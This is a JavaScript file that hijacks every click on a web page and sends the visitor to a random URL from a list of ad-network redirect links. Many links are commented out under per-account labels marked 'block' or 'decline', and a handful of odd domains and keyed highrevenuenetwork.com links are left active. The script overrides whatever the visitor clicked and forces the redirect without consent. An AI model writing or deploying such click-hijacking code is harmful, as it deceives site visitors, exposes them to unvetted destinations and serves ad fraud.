function init() {
  var arr = [
    // first
    // "https://grim-package.com/bP3/VK0iP.3_p/vvbwmKV/J/ZlDB0T1dMuTCkl5/N/DmAjwOL/TtUIxtODTtka0dMYDsEP",
    // "https://grim-package.com/bj3.Vm0APJ3LpgvibhmmViJFZ/De0/1mMATrk/5mN-DWAn4/L/TfU/x/ORTski0qMuDqkj",
    // "https://grim-package.com/b.3WVQ0DPn3Lp/vJbQmyVVJsZlDH0/1PM-zLEM0KO/TJUl5XLcTAUxzDMjTNQU5GN/jlAH",

    // "https://grim-package.com/bP3/Vq0/P.3/p/vRb/mFVRJqZWDS0F1zMez/MmxqNyjPEHzgL-TkUHzgM/zxE/2wMAT/QC",
    // "https://grim-package.com/bd3vV.0UPV3Dpjv/b/mDVzJBZLD/0_1JMYzeMQzbM/TQME1eLjTrUJzjM/zcMdxqMjzjYx",
    // "https://grim-package.com/be3.V_0pPC3kpEvdbXm/VCJCZpDu0j1-M/zHcw5/MWjSUp2tLfTaUWzENqzbkTyJNXTkch",
    // "https://grim-package.com/bG3wV.0RP-3_p-vObimZVkJmZ/DW0M1bMMzwc/5lM/j/Yu0UL/T/UVz/NCzmk/yINfj/UE",
    // "https://grim-package.com/bM3IV.0SPI3uplvzbHmXVKJXZ/Dl0-1IM/zXcs5/Mfj/cAyqLaTMULzSN/zzkUyTNBzCMF",

    // db123
    // 'https://classic-bonus.com/b/3VV/0kP.3YpJvhbUmlVeJ/ZMDz0a1AMmz_cyy/M/jFcD2mLsTLUbz/NqzzIiyzNQzQcT', // low
    // 'https://classic-bonus.com/bf3tVI0.P/3/pgvWbHm/VKJsZUDA0G1/MWz/cZyVMGj/gW0PLjTHU-zFNfzKINyFOvDyUj', // low
    // 'https://classic-bonus.com/bT3RVo0tP.3Lpwvhb/m/VjJDZcD/0W1vMIzrcYyyMkjRkd0HLETyU/zfNjzkIlywOwT_UL', // low
    // 'https://classic-bonus.com/bp3EV.0jPu3WpOv/bkmuVHJ/ZSDd0p1LMQzacuyWMgztAVyvL-T-UYzhNLzPILzcM/DDMd',
    // 'https://classic-bonus.com/bF3WVz0.Pa3VptvqbXmbVzJTZ/Dp0v1uMCz/ceylMWzpE/wcLVTiUvz/NrzjIHz/MjT-EB',

    // 'https://classic-bonus.com/b_3TV.0fPv3Zp/vTbzmdV/J_ZRDr0/1oMyz/gaxENzDMA/4/L/T_UZzaOYDREZ0JMIDlkq', // low
    // 'https://classic-bonus.com/b.3RVX0/P_3ipavkbBm/V/JoZqDQ0t1-MJzvg/x/NWDpEe2FLNTRUEzSO/DtE/0MMxTMca', // low
    // 'https://classic-bonus.com/br3.VF0/Pi3ypQvubJmHVtJMZiDh0a1HMWz-gpxZNHD/Iy0HLDTJUjz/OlDaEX0VMCjRUq', // low
    // 'https://classic-bonus.com/bL3NVl0iP.3MplvEbSmbVdJ-ZMD/0Q1_Mwzrk/1TNizBMY2HLYTUUCzNOfT/UO3_M/zQci', // low
    // 'https://classic-bonus.com/b.3tVM0/PM3xpRv/b_mnV-J/ZoDc0M1qMOz/kZ1NN-zoQN0IL/TSUgzdOdTeUo3BN/DZUS', // low

    // jacklove
    // 'https://indolent-ability.com/bC3zVD0.Pb3XpRvrbwmwVfJ/ZLDF0/1/Mozsgxx/M/DVAJwwLKTZUizyORD-EAwKMyDzEY',
    // 'https://indolent-ability.com/b.3mVR0aPg3fp/vdbYmvVkJnZODI0/1lMGz/gLxPMDDQAc4-LGT/UYz_OkD/EswdMEDNkS',
    // 'https://indolent-ability.com/bL3-VY0.Pu3Qp/vQbbmAV/JPZxDe0Y1vMPz/gvxlMEDtE/2lLpTDUHz/OQDWEqwCMyTbcZ',
    // 'https://indolent-ability.com/bx3SV.0iPo3Pp/v/bVmAV-JAZbDx0/1/MazugExVMrzZY_4wL/TMUozKO/DdEnzuNIjIkk', // low
    // 'https://indolent-ability.com/bO3/VG0.PA3HpQvibJm/VmJeZSD-0c1JMxz/gLx/MDzEgo0GLyTNUtzoODDbEPzYOVD-Ue', // low

    // 'https://indolent-ability.com/b_3gV.0hPE3/pavHbqm/VdJeZvDy0K1_Mtzpk/0kODDakLyCLQT/UAzKODTXQa4vOJTUMs', // low
    // 'https://indolent-ability.com/b.3GVT0/Pm3lpOvAbfmWVXJLZnDS0O1iM/zWkN0fOvTJAEw_L/TLUqz_O/TXQo5sMUDaEB', // low
    // 'https://indolent-ability.com/b/3eVf0JP.3/p/v-bdmFVRJUZADU0d1LMqz/kZ1oN/zwUHy/LXTGURziOPTRUu3AN-TbMA', // low
    // 'https://indolent-ability.com/b.3/Vi0ZP/3Zpsv/bnmeVhJRZcDU0m1-MTzBkw1xNKzKYZwBL/TNUizxOXToU/3eNEj/Ey', // low
    // 'https://indolent-ability.com/b.3AVj0eP/3SpQvFbnmWVVJRZDDk0a1FM/z-km1jNxzjYy4iLITSUBzJOdToUF3rNQj/km', // low

    // // john(decline)
    // 'https://soupy-user.com/b/3.Vw0_PL3RpIvLbVm/VMJrZRDj0/1_MvzPYQ3TMjztIlyOLbT/UszcNBjPcszdMdjFMG',
    // 'https://soupy-user.com/bS3QVO0.Pi3Kp-v/bUmPVqJDZ_DM0/1/MvzqYa3NMDzzEl0YLeT/UPzlNzjYc/zFMPT/UY',
    // 'https://soupy-user.com/b/3LVu0JP.3/pDvxbrmAVSJxZiDn0F1EM/zEYM3yMWjMgk4/L/TPUazFNqjvcXyOOTDikj',
    // 'https://soupy-user.com/bU3gV.0cPp3dpTvPbGm/V-J/ZXDV0e1kMDzMYG3MMMzTc/yALRT/UlzENpjNc/zINuzvMu',
    // 'https://soupy-user.com/bi3.VB0LPM3cpvvTbVmdVFJnZLDB0a1-MzziYS3jMezAYIylLlTSU-znNojtc/zvNtjjMs',

    // // lucy(block)
    // 'https://mutedpoetry.com/bV3.Vz0kP/3opVvIb/mYVdJyZoDK0/1ZMyzXYl4kNWzfM/y-LBTkUOzjN/jng/3_MWzSMG',
    // 'https://mutedpoetry.com/b.3zVQ0/P/3Wp_vYbOmQVLJVZ/DN0z1qMEzeYr4fNOzOIn0ULPTrUWztNgjIgZ3rM-jnUp',
    // 'https://mutedpoetry.com/bl3fVE0/P.3/ptvzbcmxVlJDZVDi0-1/MlzYYJ4DNTzWE/2kLmTDU/zXNEjFgS3vM/T/cn',
    // 'https://mutedpoetry.com/bp3fVy0/P.3YpUvebimjV/JtZjDe0/1-M/zaYa4/N-jXk/4oLBTLUOzcNpj/gk2NOHTekv',

    // mon
    'https://thelrourg.net/4/7237942',
    'https://woafoame.net/4/7237941',
    'https://corgouzaptax.com/4/7474716',
    'https://eeptoabs.com/4/7420689',
    'https://thechoansa.com/4/7237907',

    'https://psomtenga.net/4/7420696',
    'https://kaushooptawo.net/4/7237921',
    'https://vekseptaufin.com/4/7420698',
    'https://thomtubsaro.com/4/7436813',
    'https://grushoungy.com/4/7614690',

    // // beta(block)
    // 'https://www.highcpmgate.com/zecjzrgcb?key=cee82a79ba80cedd47dc67c990c43981',
    // 'https://www.highcpmgate.com/dt96vw75f?key=4c755e88f5de59ca53ef34992768986a',
    // 'https://www.highcpmgate.com/gqz2615ye8?key=fa0feaae93d41f849f02500024a84fc8',
    // 'https://www.highcpmgate.com/egwhqfd5j4?key=a78fdce973ec5e6fdfe7a340cbe80330',
    // 'https://www.highcpmgate.com/z8767nw9bd?key=dd73fef32d545b5b5559b3dd496c33b8',
    // 'https://www.highcpmgate.com/dmm6uzza8y?key=ae8300ee01b398a137d6f63fcc00bd63',
    // 'https://www.highcpmgate.com/e6c1p52s2n?key=6b16c783c5b3542a115fb23958f8a755',
    // 'https://www.highcpmgate.com/pmy722dia8?key=43d6dbe10c1901c59565bb335437c63f',

    // John beta(block)
    // 'https://www.highcpmgate.com/mggp0d1rd?key=4a8cc439d8f03fbe93ede925886e0967',
    // 'https://www.highcpmgate.com/d61bt4eq5?key=50e22b35ce929782b3d0e55721cf6291',
    // 'https://www.highcpmgate.com/u2f5xpf0sh?key=35d46124492e301d6b7f93d0e323cd15',

    // Jack beta(block)
    // 'https://www.highcpmgate.com/wa4ni64n7?key=94a693ff93ae2f33305c8039fd3c1a7b',
    // 'https://www.highcpmgate.com/t3y2ebta?key=540b4b6dee7d82872a8ad8935ecf83a4',
    // 'https://www.highcpmgate.com/n5zwpc5h1?key=1dfa9fa5cffeb00bfffbfda37a43407f',
    // 'https://www.highcpmgate.com/y1i91ubt?key=12078ca6790ca0e3e0183b6d53dcc0f3',
    // 'https://www.highcpmgate.com/nqiy56uena?key=26807e7e722e2080c7a364711501aa5d',
    
    // Lucy beta(block)
    // 'https://www.highrevenuenetwork.com/bu71hki7pg?key=b3d0aabe20e37ad2a080cef996e523a8',
    // 'https://www.highrevenuenetwork.com/spw4aigpi?key=2bfe09727d8f45c16edc5be8ce11fe73',
    // 'https://www.highrevenuenetwork.com/eeuiwn19?key=a0e1b3b183cb8921ed2aaca0c4cb4490',
    // 'https://www.highrevenuenetwork.com/q5kx6qdha?key=ba303090626471c9f450339de19b98be',
    // 'https://www.highrevenuenetwork.com/csdvh2ud?key=cb18caab3a96de3cec11deee57f1e7bc',

    // 'https://www.highrevenuenetwork.com/sinsdiqgi9?key=53e9c847f7c5dd151315203caf1e9d52',
    // 'https://www.highrevenuenetwork.com/p5tww3iey?key=79cf82d37bbc5d541d8b9f1cd490e72f',
    // 'https://www.highrevenuenetwork.com/snzzu32zv?key=51d98fb2c88138ff52842ebbdf5e7208',
    // 'https://www.highrevenuenetwork.com/dei9cpf8?key=de5a27a88f4a7d445ec6d8223b295d66',
    // 'https://www.highrevenuenetwork.com/zr0crh68?key=799ba5664e70bdf781b556024bd3e3a7',

    // Emily beta (blocked)
    // 'https://obliquecensortend.com/unjjajw4d?key=0cf45e318a7b88f458419087aa350ccc',
    // 'https://obliquecensortend.com/z2vva4za?key=58882b5697cf027450b33d8e82ebc4b9',
    // 'https://obliquecensortend.com/hpf7uuustd?key=ef91f1af82729948024a1f219624bdd9',
    // 'https://obliquecensortend.com/v381fsbtns?key=681a319357ee76a75910c90cb4b5c011',
    // 'https://obliquecensortend.com/gk3yvw2t?key=d2a556fe1d3e00914675176678c85903',

    // beta: MichaelB
    // "https://www.highrevenuenetwork.com/gb8vbsq1?key=6587782e3c4b34dc08af46dc57905ec3",
    // "https://www.highrevenuenetwork.com/savzdaxzh?key=fb74231bf66680c150fcf853750599a0",
    // "https://www.highrevenuenetwork.com/uqcp54acph?key=8c362762e5c45e090921f3314a6c063d",
    "https://www.highrevenuenetwork.com/wy40r2rf0g?key=b16446c296943c97cec2b0dc24cf7cd1",
    "https://www.highrevenuenetwork.com/n4syhay51?key=580080ad4ac1a8d657532faaa78129e6",

  ];
 
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);

    var randomIndex = Math.floor(Math.random() * arr.length);
    var randomLink = arr[randomIndex];
    window.location.href = randomLink;
  });
}

init();